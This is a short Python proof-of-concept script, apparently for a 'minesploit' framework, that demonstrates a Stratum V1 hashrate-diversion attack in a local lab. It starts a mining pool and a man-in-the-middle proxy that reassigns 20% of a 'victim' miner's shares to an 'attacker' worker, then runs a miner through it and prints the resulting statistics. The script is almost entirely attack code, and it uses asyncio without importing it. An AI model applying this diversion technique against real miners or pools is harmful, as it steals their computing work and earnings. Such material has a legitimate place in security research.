#!/usr/bin/env -S minesploit -s
"""Stratum V1 hashrate diversion hypothesis"""

from minesploit.protocols.stratum.proxy import StratumProxy
from minesploit.protocols.stratum.server import StratumServer
from minesploit.protocols.stratum.sniffer import StratumSniffer
from minesploit.utils.miner import CPUMiner, PoolConfig

pool = StratumServer(port=3333).start()
sniffer = StratumSniffer(
    listen_port=3334, upstream_port=3333, upstream_user="attacker.worker", steal_ratio=0.2
).start()

await asyncio.sleep(0.5)

miner = CPUMiner(threads=1).mine_at(PoolConfig(host="127.0.0.1", port=3334, user="victim.worker"))

await asyncio.sleep(10)

print(f"Pool stats: {pool.get_stats()}")
print(f"Proxy active: {sniffer._running}")
print(f"Miner stats: {miner.get_stats()}")

miner.stop()
sniffer.stop()
pool.stop()
